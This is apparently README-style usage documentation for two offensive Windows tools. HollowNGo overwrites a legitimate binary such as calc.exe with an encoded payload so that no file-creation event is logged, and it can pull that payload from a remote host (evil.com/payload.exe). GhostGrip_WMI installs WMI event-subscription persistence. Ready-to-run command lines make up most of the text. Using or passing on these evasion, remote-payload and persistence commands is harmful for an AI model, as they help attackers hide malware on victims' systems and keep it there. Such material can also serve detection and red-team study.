HollowNGo aims to avoid FileCreation Events by reading your payload as a byte array, compressing them, and converting the compressed bytes to base64 to a memorysteam. setting the target file stream length to 0, then the same encoding operation in reverse to write to the target file. There are a few options when running the tool as shown below.

Create compressed encoded binary data (This is expected to run on your dev box not the target)
HollowNGo.exe -encode <source.exe> -output <output.txt>
example: HollowNGo.exe C:\Users\User\Documents\MyEvil.Exe -output EvilB64.txt

Via data output from -encode option
HollowNGo.exe -source <base64_content> -target <target.exe>
Example: dotnet inline-execute HollowNGo.exe -sourcelocal <EvilB64.Code> -target C:\Windows\System32\calc.exe

Via remote hosted file
HollowNGo.exe -sourceremote <SourceURI> -target <target.exe>
Example: dotnet inline-execute HollowNGo.exe -sourceremote http://evil.com/payload.exe -target C:\Windows\System32\calc.exe


GhostGrip_WMI creates a WMIEventSubscription for your prefered event for persistence. Use HollowNGo prior to set up your executable to avoid FileCreation Events.

GhostGrip_WMI.exe -location <path_to_executable> -type <time/logon/eventcode> -randomizename true/false
example dotnet inline-exeucte GhostGrip_WMI.exe -location C:\Windows\System32\calc.exe -type eventcode -eventcode 4726 -randomizename true
example dotnet inline-exeucte GhostGrip_WMI.exe -location C:\Windows\System32\calc.exe -type logon -randomizename false
